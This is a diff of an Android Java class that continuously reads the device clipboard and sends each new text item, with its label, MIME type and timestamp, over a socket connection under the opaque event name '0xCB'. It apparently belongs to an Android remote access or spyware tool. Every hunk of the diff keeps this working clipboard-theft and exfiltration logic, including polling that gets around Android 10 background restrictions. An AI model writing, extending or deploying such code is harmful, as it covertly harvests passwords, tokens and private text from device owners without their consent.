@@ -16,68 +16,43 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
 
+// Clipboard monitor
 public final class ClipboardMonitor {
 
-    private static final long POLL_INTERVAL_MS = 3000; // 3 seconds polling interval
-    private static final long LISTENER_CHECK_INTERVAL_MS = 30000; // 30 seconds
+    private static final long POLL_INTERVAL = 3000;
+    private static final long MIN_EMIT = 1000;
 
     private static ClipboardMonitor instance;
     private final Context ctx;
-    private final Handler mainHandler;
-    private final ExecutorService executor;
+    private final Handler handler;
+    private final ExecutorService exec;
 
-    private ClipboardManager clipboardManager;
-    private ClipboardManager.OnPrimaryClipChangedListener clipListener;
-    private final AtomicBoolean isRunning = new AtomicBoolean(false);
-    private final AtomicBoolean usePolling = new AtomicBoolean(false);
+    private ClipboardManager mgr;
+    private ClipboardManager.OnPrimaryClipChangedListener listener;
+    private final AtomicBoolean running = new AtomicBoolean(false);
+    private final AtomicBoolean polling = new AtomicBoolean(false);
 
     private String lastText;
-    private long lastEmitTime = 0;
-    private static final long MIN_EMIT_INTERVAL = 1000; // 1 second minimum between emissions
+    private long lastEmit = 0;
 
-    private final Runnable pollRunnable = new Runnable() {
+    private final Runnable pollTask = new Runnable() {
         @Override
         public void run() {
-            if (!isRunning.get()) return;
-
-            pollClipboard();
-
-            // Schedule next poll
-            if (usePolling.get()) {
-                mainHandler.postDelayed(this, POLL_INTERVAL_MS);
+            if (!running.get()) return;
+            poll();
+            if (polling.get()) {
+                handler.postDelayed(this, POLL_INTERVAL);
             }
-        }
-    };
-
-    private final Runnable listenerCheckRunnable = new Runnable() {
-        @Override
-        public void run() {
-            if (!isRunning.get()) return;
-
-            // Check if listener is still registered, if not switch to polling
-            if (clipboardManager != null && clipListener != null) {
-                try {
-                    // Try to emit current clipboard to verify listener works
-                    if (!usePolling.get()) {
-                        emit(true);
-                    }
-                } catch (Exception e) {
-                    // Listener might have died, switch to polling
-                    usePolling.set(true);
-                    startPolling();
-                }
-            }
-
-            mainHandler.postDelayed(this, LISTENER_CHECK_INTERVAL_MS);
         }
     };
 
     private ClipboardMonitor(Context context) {
         this.ctx = context.getApplicationContext();
-        this.mainHandler = new Handler(Looper.getMainLooper());
-        this.executor = Executors.newSingleThreadExecutor();
+        this.handler = new Handler(Looper.getMainLooper());
+        this.exec = Executors.newSingleThreadExecutor();
     }
 
+    // Get singleton instance
     public static synchronized ClipboardMonitor getInstance(Context context) {
         if (instance == null) {
             instance = new ClipboardMonitor(context);
@@ -85,111 +60,100 @@ public final class ClipboardMonitor {
         return instance;
     }
 
+    // Start monitoring
     public synchronized void start() {
-        if (isRunning.getAndSet(true)) return; // Already running
+        if (running.getAndSet(true)) return;
 
-        if (clipboardManager == null) {
-            clipboardManager = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
+        if (mgr == null) {
+            mgr = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
         }
 
-        if (clipboardManager == null) {
-            isRunning.set(false);
+        if (mgr == null) {
+            running.set(false);
             return;
         }
 
-        // On Android 10+ (API 29+), clipboard access in background is restricted
-        // Use polling as the primary method
+        // Android 10+ uses polling due to background restrictions
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            usePolling.set(true);
-            startPolling();
+            polling.set(true);
+            handler.post(pollTask);
         } else {
-            // On older versions, try listener first
             startListener();
         }
 
-        // Start listener health check
-        mainHandler.postDelayed(listenerCheckRunnable, LISTENER_CHECK_INTERVAL_MS);
-
-        // Emit initial state
-        executor.execute(() -> emit(true));
+        exec.execute(() -> emit(true));
     }
 
+    // Start listener
     private void startListener() {
-        if (clipboardManager == null || clipListener != null) return;
+        if (mgr == null || listener != null) return;
 
         try {
-            clipListener = () -> {
-                if (isRunning.get()) {
-                    executor.execute(() -> emit(false));
+            listener = () -> {
+                if (running.get()) {
+                    exec.execute(() -> emit(false));
                 }
             };
-            clipboardManager.addPrimaryClipChangedListener(clipListener);
-            usePolling.set(false);
+            mgr.addPrimaryClipChangedListener(listener);
+            polling.set(false);
         } catch (Exception e) {
-            // Listener registration failed, use polling
-            usePolling.set(true);
-            startPolling();
+            polling.set(true);
+            handler.post(pollTask);
         }
     }
 
-    private void startPolling() {
-        mainHandler.removeCallbacks(pollRunnable);
-        mainHandler.post(pollRunnable);
-    }
-
+    // Stop monitoring
     public synchronized void stop() {
-        if (!isRunning.getAndSet(false)) return; // Already stopped
+        if (!running.getAndSet(false)) return;
 
-        mainHandler.removeCallbacks(pollRunnable);
-        mainHandler.removeCallbacks(listenerCheckRunnable);
+        handler.removeCallbacks(pollTask);
 
-        if (clipboardManager != null && clipListener != null) {
+        if (mgr != null && listener != null) {
             try {
-                clipboardManager.removePrimaryClipChangedListener(clipListener);
+                mgr.removePrimaryClipChangedListener(listener);
             } catch (Exception ignored) {}
         }
 
-        clipListener = null;
+        listener = null;
         lastText = null;
-        usePolling.set(false);
+        polling.set(false);
     }
 
-    public synchronized void emitClipboardSnapshot() {
-        if (!isRunning.get()) {
-            // Temporarily enable to get current clipboard
-            emit(true);
-        } else {
-            emit(true);
-        }
+    // Emit clipboard snapshot
+    public void emit() {
+        emit(true);
     }
 
-    private void pollClipboard() {
-        if (clipboardManager == null) {
-            clipboardManager = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
-        }
+    // Legacy method
+    public void emitClipboardSnapshot() {
+        emit(true);
+    }
 
-        if (clipboardManager == null) return;
+    // Poll clipboard
+    private void poll() {
+        if (mgr == null) {
+            mgr = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
+        }
+        if (mgr == null) return;
 
         try {
-            if (clipboardManager.hasPrimaryClip()) {
+            if (mgr.hasPrimaryClip()) {
                 emit(false);
             }
-        } catch (Exception ignored) {
-            // Clipboard access might be restricted
-        }
+        } catch (Exception ignored) {}
     }
 
+    // Emit clipboard content
     private void emit(boolean allowDup) {
-        if (clipboardManager == null) {
-            clipboardManager = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
+        if (mgr == null) {
+            mgr = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
         }
-
-        if (clipboardManager == null) return;
+        if (mgr == null) return;
 
         try {
-            if (!clipboardManager.hasPrimaryClip()) return;
+            if (!mgr.hasPrimaryClip()) return;
 
-            ClipData clip = clipboardManager.getPrimaryClip();
+            ClipData clip = mgr.getPrimaryClip();
             if (clip == null || clip.getItemCount() == 0) return;
 
             CharSequence text = clip.getItemAt(0).getText();
@@ -197,19 +161,18 @@ public final class ClipboardMonitor {
 
             String s = text.toString();
 
-            // Check for duplicate
+            // Check duplicate
             if (!allowDup && s.equals(lastText)) return;
 
-            // Rate limiting
+            // Rate limit
             long now = System.currentTimeMillis();
-            if (!allowDup && (now - lastEmitTime) < MIN_EMIT_INTERVAL) return;
+            if (!allowDup && (now - lastEmit) < MIN_EMIT) return;
 
             JSONObject data = new JSONObject();
             data.put("text", s);
             data.put("timestamp", now);
             data.put("length", s.length());
 
-            // Get clip description if available
             if (clip.getDescription() != null) {
                 data.put("label", clip.getDescription().getLabel());
                 data.put("mimeType", clip.getDescription().getMimeType(0));
@@ -218,23 +181,18 @@ public final class ClipboardMonitor {
             SocketClient.getInstance().getSocket().emit("0xCB", data);
 
             lastText = s;
-            lastEmitTime = now;
-        } catch (Exception e) {
-            // On Android 10+, background clipboard access throws exception
-            // This is expected behavior - the polling will continue trying
-        }
+            lastEmit = now;
+        } catch (Exception ignored) {}
     }
 
+    // Check if running
     public boolean isRunning() {
-        return isRunning.get();
+        return running.get();
     }
 
-    public boolean isUsingPolling() {
-        return usePolling.get();
-    }
-
+    // Shutdown
     public void shutdown() {
         stop();
-        executor.shutdown();
+        exec.shutdown();
     }
 }
